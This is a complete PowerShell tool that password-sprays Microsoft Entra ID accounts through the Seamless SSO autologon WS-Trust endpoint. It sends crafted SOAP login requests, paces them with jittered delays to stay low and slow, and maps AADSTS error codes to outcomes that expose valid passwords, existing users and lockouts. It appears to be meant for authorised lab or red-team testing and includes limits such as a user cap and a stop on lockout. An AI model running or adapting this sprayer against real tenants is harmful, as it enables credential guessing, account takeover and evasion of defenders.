[CmdletBinding()]
param(
    [Parameter(Mandatory)]
    [ValidatePattern('^[A-Za-z0-9.-]+$')]
    [string]$Domain,

    [Parameter(Mandatory)]
    [ValidateScript({ Test-Path -LiteralPath $_ -PathType Leaf })]
    [string]$UserListPath,

    [SecureString]$Password,

    [ValidateRange(1, 20)]
    [int]$MaximumUsers = 7,

    [ValidateRange(0, 300)]
    [int]$DelaySeconds = 5,

    [ValidateRange(0, 100)]
    [int]$JitterPercent = 10,

    [ValidateNotNullOrEmpty()]
    [string]$UserAgent = 'LowSlow-Autologon-Validation/1.0',

    [string]$OutputPath = (Join-Path (Get-Location) ("autologon-validation-{0}.csv" -f (Get-Date -Format 'yyyyMMdd-HHmmss')))
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

function Invoke-CompatWebRequest {
    <#
        .SYNOPSIS
        POST that returns status + body on any HTTP code, on both Windows
        PowerShell 5.1 and PowerShell 7+.

        .DESCRIPTION
        PowerShell 7 has Invoke-WebRequest -SkipHttpErrorCheck. 5.1 does not:
        it throws on non-2xx and has already drained the error stream by the
        time the exception surfaces, so the SOAP fault body carrying the
        AADSTS code is lost. These labs depend on reading that body, so this
        uses HttpClient, which never throws on a status code.

        Body accepts a hashtable (form-encoded), a string, or a byte array.
    #>
    param(
        [Parameter(Mandatory)][string]$Uri,
        [Parameter(Mandatory)][hashtable]$Headers,
        [Parameter(Mandatory)][string]$ContentType,
        [Parameter(Mandatory)]$Body,
        [int]$TimeoutSec = 30
    )

    Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue

    $handler = New-Object System.Net.Http.HttpClientHandler
    $handler.AutomaticDecompression =
        [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
    $client = New-Object System.Net.Http.HttpClient($handler)
    $client.Timeout = [TimeSpan]::FromSeconds($TimeoutSec)

    $content = $null
    $response = $null

    try {
        if ($Body -is [System.Collections.IDictionary]) {
            # Covers both @{} (Hashtable) and [ordered]@{} (OrderedDictionary).
            $pairs = New-Object 'System.Collections.Generic.List[System.Collections.Generic.KeyValuePair[string,string]]'
            foreach ($k in $Body.Keys) {
                $pairs.Add((New-Object 'System.Collections.Generic.KeyValuePair[string,string]'($k, [string]$Body[$k])))
            }
            $content = New-Object System.Net.Http.FormUrlEncodedContent -ArgumentList (,$pairs)
        }
        elseif ($Body -is [byte[]]) {
            $content = New-Object System.Net.Http.ByteArrayContent -ArgumentList (,$Body)
        }
        else {
            $bytes = [Text.Encoding]::UTF8.GetBytes([string]$Body)
            $content = New-Object System.Net.Http.ByteArrayContent -ArgumentList (,$bytes)
        }

        $content.Headers.Remove('Content-Type') | Out-Null
        $content.Headers.TryAddWithoutValidation('Content-Type', $ContentType) | Out-Null

        foreach ($name in $Headers.Keys) {
            $client.DefaultRequestHeaders.TryAddWithoutValidation(
                [string]$name, [string]$Headers[$name]) | Out-Null
        }

        $response = $client.PostAsync($Uri, $content).GetAwaiter().GetResult()
        $text = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()

        return [pscustomobject]@{
            StatusCode = [int]$response.StatusCode
            Content    = [string]$text
        }
    }
    finally {
        if ($content) { $content.Dispose() }
        if ($response) { $response.Dispose() }
        $client.Dispose()
        $handler.Dispose()
    }
}


function ConvertTo-XmlEncodedText {
    param([AllowEmptyString()][string]$Value)
    return [System.Security.SecurityElement]::Escape($Value)
}

function Get-AutologonOutcome {
    param(
        [string]$Code,
        [bool]$HasDesktopSsoToken
    )

    if ($HasDesktopSsoToken) {
        return 'VALID_TOKEN_DISCARDED'
    }

    switch ($Code) {
        'AADSTS50126' { return 'INVALID_CREDENTIAL' }
        'AADSTS50034' { return 'USER_NOT_FOUND' }
        'AADSTS50053' { return 'LOCKED_OR_SOURCE_BLOCKED' }
        'AADSTS50055' { return 'VALID_PASSWORD_EXPIRED' }
        'AADSTS50057' { return 'ACCOUNT_DISABLED' }
        'AADSTS50076' { return 'VALID_PASSWORD_MFA_REQUIRED' }
        'AADSTS53003' { return 'VALID_PASSWORD_CA_BLOCKED' }
        default {
            if ($Code) { return 'AADSTS_FAILURE' }
            return 'UNKNOWN_RESPONSE'
        }
    }
}

$users = @(
    Get-Content -LiteralPath $UserListPath |
        ForEach-Object { $_.Trim() } |
        Where-Object { $_ -and -not $_.StartsWith('#') } |
        Select-Object -Unique -First $MaximumUsers
)

if ($users.Count -eq 0) {
    throw "No users were found in $UserListPath."
}

if (-not $Password) {
    $Password = Read-Host 'Spray password' -AsSecureString
}

$secretPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
$plainPassword = $null
$results = [System.Collections.Generic.List[object]]::new()

try {
    $plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($secretPointer)
    $endpoint = "https://autologon.microsoftazuread-sso.com/$Domain/winauth/trust/2005/usernamemixed"

    Write-Host "Direct WS-Trust validation: $($users.Count) users against $endpoint"
    Write-Host 'Any DesktopSsoToken returned by the service will be discarded.'

    for ($index = 0; $index -lt $users.Count; $index++) {
        $upn = $users[$index]
        $requestId = [guid]::NewGuid().ToString()
        $created = (Get-Date).ToUniversalTime()
        $expires = $created.AddMinutes(10)
        $requestUri = "$endpoint`?client-request-id=$requestId"

        $xmlDomain = ConvertTo-XmlEncodedText $Domain
        $xmlUpn = ConvertTo-XmlEncodedText $upn
        $xmlPassword = ConvertTo-XmlEncodedText $plainPassword
        $xmlEndpoint = "https://autologon.microsoftazuread-sso.com/$xmlDomain/winauth/trust/2005/usernamemixed"
        $body = @"
<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
            xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"
            xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy"
            xmlns:wsa="http://www.w3.org/2005/08/addressing"
            xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
  <s:Header>
    <wsa:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
    <wsa:To s:mustUnderstand="1">$xmlEndpoint</wsa:To>
    <wsa:MessageID>urn:uuid:$requestId</wsa:MessageID>
    <wsse:Security s:mustUnderstand="1">
      <wsu:Timestamp wsu:Id="_0">
        <wsu:Created>$($created.ToString('yyyy-MM-ddTHH:mm:ss.fffZ'))</wsu:Created>
        <wsu:Expires>$($expires.ToString('yyyy-MM-ddTHH:mm:ss.fffZ'))</wsu:Expires>
      </wsu:Timestamp>
      <wsse:UsernameToken wsu:Id="user">
        <wsse:Username>$xmlUpn</wsse:Username>
        <wsse:Password>$xmlPassword</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </s:Header>
  <s:Body>
    <wst:RequestSecurityToken>
      <wsp:AppliesTo>
        <wsa:EndpointReference>
          <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
        </wsa:EndpointReference>
      </wsp:AppliesTo>
      <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
      <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
    </wst:RequestSecurityToken>
  </s:Body>
</s:Envelope>
"@

        $stopwatch = [Diagnostics.Stopwatch]::StartNew()
        try {
            $response = Invoke-CompatWebRequest -Uri $requestUri `
                -Headers @{
                    'Accept'                   = 'application/soap+xml, application/xml'
                    'client-request-id'        = $requestId
                    'return-client-request-id' = 'true'
                    'User-Agent'               = $UserAgent
                } `
                -ContentType 'application/soap+xml; charset=utf-8' `
                -Body ([Text.Encoding]::UTF8.GetBytes($body)) `
                -TimeoutSec 30
            $stopwatch.Stop()

            $responseBody = [string]$response.Content
            $code = if ($responseBody -match 'AADSTS\d+') { $Matches[0] } else { '' }
            $hasToken = $responseBody -match '<(?:\w+:)?DesktopSsoToken(?:\s|>)'
            $outcome = Get-AutologonOutcome -Code $code -HasDesktopSsoToken $hasToken

            $result = [pscustomobject]@{
                AttemptUtc  = $created.ToString('o')
                User        = $upn
                RequestId   = $requestId
                HttpStatus  = [int]$response.StatusCode
                AADSTSCode  = $code
                Outcome     = $outcome
                DurationMs  = $stopwatch.ElapsedMilliseconds
                UserAgent   = $UserAgent
            }
            $responseBody = $null
            $response = $null
        }
        catch {
            $stopwatch.Stop()
            $result = [pscustomobject]@{
                AttemptUtc  = $created.ToString('o')
                User        = $upn
                RequestId   = $requestId
                HttpStatus  = 0
                AADSTSCode  = ''
                Outcome     = "REQUEST_ERROR: $($_.Exception.Message)"
                DurationMs  = $stopwatch.ElapsedMilliseconds
                UserAgent   = $UserAgent
            }
        }

        $results.Add($result)
        Write-Host ('{0} | {1} | HTTP {2} | {3} | {4} | {5} ms' -f `
            $result.AttemptUtc, $result.User, $result.HttpStatus, $result.AADSTSCode, $result.Outcome, $result.DurationMs)

        if ($result.AADSTSCode -eq 'AADSTS50053') {
            Write-Warning 'AADSTS50053 observed. Stopping immediately.'
            break
        }

        if ($index -lt ($users.Count - 1) -and $DelaySeconds -gt 0) {
            $jitter = [math]::Round($DelaySeconds * ($JitterPercent / 100))
            $minimumDelay = [math]::Max(0, $DelaySeconds - $jitter)
            $maximumDelay = $DelaySeconds + $jitter
            $actualDelay = if ($maximumDelay -gt $minimumDelay) {
                Get-Random -Minimum $minimumDelay -Maximum ($maximumDelay + 1)
            }
            else {
                $DelaySeconds
            }
            Start-Sleep -Seconds $actualDelay
        }
    }
}
finally {
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($secretPointer)
    $plainPassword = $null
    if ($Password) { $Password.Dispose() }
}

$outputDirectory = Split-Path -Parent $OutputPath
if ($outputDirectory -and -not (Test-Path -LiteralPath $outputDirectory)) {
    New-Item -ItemType Directory -Path $outputDirectory -Force | Out-Null
}
$results | Export-Csv -LiteralPath $OutputPath -NoTypeInformation -Encoding utf8

Write-Host "Sanitized results written to: $OutputPath"
$results
